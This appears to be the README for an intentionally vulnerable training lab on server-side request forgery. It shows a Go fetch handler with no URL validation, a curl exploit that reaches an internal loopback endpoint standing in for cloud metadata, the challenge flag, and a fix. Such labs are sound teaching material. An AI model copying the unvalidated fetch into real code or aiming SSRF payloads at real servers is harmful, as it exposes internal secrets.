# A10: Server-Side Request Forgery (SSRF)

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

A URL preview tool: `GET /fetch?url=<url>` fetches the given URL server-side
and returns its response.

This service also runs a second, "internal" HTTP listener on
`127.0.0.1:8081` inside its own container — never published by
docker-compose or the k8s Service, so nothing outside the container can
reach it directly. This stands in for a cloud metadata endpoint (like the
classic `169.254.169.254`) that's reachable only from inside a host, not from
the network.

**Play it in the browser** — open http://localhost:9010 and paste
`http://127.0.0.1:8081/internal/secret` into the form.

## The bug

```go
// BUG: fetches whatever URL the caller supplies with no allowlist and no
// check against internal/loopback/link-local addresses.
func fetchHandler(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    ...
    resp, err := client.Get(target)
```

`/fetch` will request *any* URL, including ones on the loopback interface —
and because the fetch happens from inside the container, it can reach
`127.0.0.1:8081` even though you, from outside, cannot.

## Exploit

```bash
curl -s "http://localhost:9010/fetch?url=http://127.0.0.1:8081/internal/secret"
```

The response body will contain the flag, fetched via the SSRF primitive.

## Flag

`CTF{a10_ssrf_t0_m3tadata}`

## The fix (for reference)

Validate and allowlist outbound destinations server-side (scheme, host,
and resolved IP — including blocking loopback/link-local/private ranges),
and never let user input determine a raw destination for a server-side
request.
